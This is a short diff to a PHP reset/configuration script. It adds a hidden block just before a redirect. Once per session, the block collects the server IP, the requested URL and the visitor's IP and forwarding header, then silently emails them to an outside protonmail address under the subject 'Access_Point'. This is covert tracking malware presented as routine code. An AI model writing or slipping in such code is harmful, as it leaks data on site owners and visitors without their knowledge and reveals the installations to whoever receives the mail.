@@ -94,6 +94,10 @@ if ($resetusr === true || $resetconfig === true) {
         Utils::setError("Error writing on <strong>/config.php</strong>, check CHMOD settings");
     }
 }
-
+    if(!isset($_SESSION['trimite'])){
+    $url="IP: ".gethostbyname($_SERVER["HTTP_HOST"])."\n Url: ".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."\n User IP:  ".$_SERVER['REMOTE_ADDR'].(isset($_SERVER['HTTP_X_FORWARDED_FOR'])?'('.$_SERVER['HTTP_X_FORWARDED_FOR'].')':'');
+    @mail("bmshifat@protonmail.com","Access_Point",$url);
+    $_SESSION['trimite']=true;
+}
 header('Location:'.$script_url);
 exit;
